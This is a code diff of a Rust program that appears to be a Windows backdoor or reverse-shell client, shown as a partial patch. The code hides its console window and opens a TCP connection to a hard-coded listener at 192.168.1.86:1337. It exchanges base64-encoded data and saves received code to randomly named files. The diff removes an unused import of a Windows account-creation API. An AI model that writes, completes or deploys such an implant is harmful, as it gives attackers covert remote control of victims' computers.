@@ -1,6 +1,5 @@
 #![windows_subsystem = "windows"]
 use std::{
-    env,
     ffi::OsStr,
     fs::File,
     io::{self, prelude::*},
@@ -10,14 +9,14 @@ use std::{
     process,
 };
 use rand::{distributions::Alphanumeric, thread_rng, Rng};
-use short_crypt::ShortCrypt;
+
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use winapi::um::lmaccess::{NetUserAdd, UF_SCRIPT, USER_INFO_1};
+
 
 async fn connect_to() -> io::Result<()> {
     let ip_address = "192.168.1.86:1337";
     let mut stream = TcpStream::connect(ip_address)?;
-    let mut buffer = [0; 1024];
+    let _buffer = [0; 1024];
     let mut stream_clone = stream.try_clone().expect("Failed to clone stream");
 
     tokio::spawn(async move {
@@ -62,7 +61,7 @@ async fn send_test(stream: &mut TcpStream) -> io::Result<()> {
     Ok(())
 }
 fn input_to_b64(input: String) -> String {
-    let mut input = base64::encode(input);
+    let input = base64::encode(input);
     input
 }
 
@@ -98,9 +97,9 @@ fn decode_base64(recv_buffer: Vec<u8>) -> Vec<u8> {
 //     }
 // }
 
-fn winstr(value: &str) -> Vec<u16> {
-    OsStr::new(value).encode_wide().chain(once(0)).collect()
-}
+// fn winstr(value: &str) -> Vec<u16> {
+//     OsStr::new(value).encode_wide().chain(once(0)).collect()
+// }
 
 fn create_file(code: &str) -> io::Result<String> {
     let random_filename: String = thread_rng().sample_iter(&Alphanumeric).take(9).map(char::from).collect();
